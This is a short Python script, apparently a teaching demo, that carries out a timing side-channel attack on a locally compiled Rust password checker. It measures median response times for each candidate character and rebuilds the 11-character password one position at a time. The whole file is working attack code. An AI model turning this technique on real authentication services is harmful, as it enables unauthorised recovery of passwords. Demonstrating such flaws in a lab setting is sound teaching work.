# author - Piper
import subprocess
import statistics
import string
import time
from pathlib import Path



BIN = Path("./target/release/timing_attack_rust2") # path to compiled rust binary (which i generated by running cargo build -- release)
PASSWORD_LEN = 11 # assume already know password length for this demo.
CHARSET = string.ascii_letters + string.digits # all nums and letters

def start_target():
    return subprocess.Popen(
        [BIN],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,          # treat stdin/stdout as text
        bufsize=1 
    )


def run_rust_binary_once(proc, guess: str) -> int:
    # run rust binary one time with specific guess and return runtime in ns
    start = time.perf_counter_ns()
    proc.stdin.write(guess + "\n")
    proc.stdin.flush()
    _ = proc.stdout.readline()  # "OK" or "NO"
    #now run the external binary
    # [str(BIN), guess] = program name + CLI argument
    # stdout/stderr need to be redirected to DEVNULL so printing doesnt affect timing
    # subprocess.run(
    #     [str(BIN), guess],
    #     stdout=subprocess.DEVNULL,
    #     stderr=subprocess.DEVNULL
    # )
    end = time.perf_counter_ns()
    return end - start # in ns

def median_time(proc, guess: str, num_run_times: int = 40, warmup: int = 3) -> int:
    # measure median runtime for a guess across many times (need many times to reduce noise)
    for i in range(warmup): # these first runs aren't recorded. just to reduce noise from overhead
        run_rust_binary_once(proc, guess)
    times = [run_rust_binary_once(proc, guess) for _ in range(num_run_times)] # run the binary num_run_times tiems
    return int(statistics.median(times))

def crack_password(length: int, samples_per_candidate: int = 60, pad_char: str = "X") -> str:
    proc = start_target()
    try:

        known_password = ""
        for i in range(length):
            timings = {} # dictionary
            for c in CHARSET:
                guess = (known_password + c).ljust(length, "X")
                timings[c] = median_time(proc, guess, num_run_times=samples_per_candidate)
            best = max(timings, key=timings.get)
            # confidence gap
            sorted_items = sorted(timings.items(), key=lambda kv: kv[1], reverse=True)
            gap = sorted_items[0][1] - sorted_items[1][1]
            known_password += best
            print(f"pos {i}: '{best}'  median={timings[best]} ns  gap={gap} ns  -> {known_password}")
        return known_password
    finally:
        proc.terminate()
        # sorted_items = sorted(timings.items(), key=lambda kv: kv[1], reverse=True)
        # best_char, best_time = sorted_items[0]
        # second_char, second_time = sorted_items[1]
        # gap = best_time - second_time

    #     known_password += best_char
    #     print(f"position {i}: '{best_char}' and median = {best_time}ns and gap = {gap}ns . currently known password is {known_password}")
    # return known_password

if __name__ == "__main__":
    recovered = crack_password(PASSWORD_LEN, samples_per_candidate=50)
    print("\nRecovered:", recovered)
    # if not BIN.exists():
    #     raise FileNotFoundError(f"binary not found at {BIN}, make sure to run cargo build --release")
    # recovered_password = crack_password(PASSWORD_LEN, samples_per_candidate=80)
    # print("the recovered password is ", recovered_password)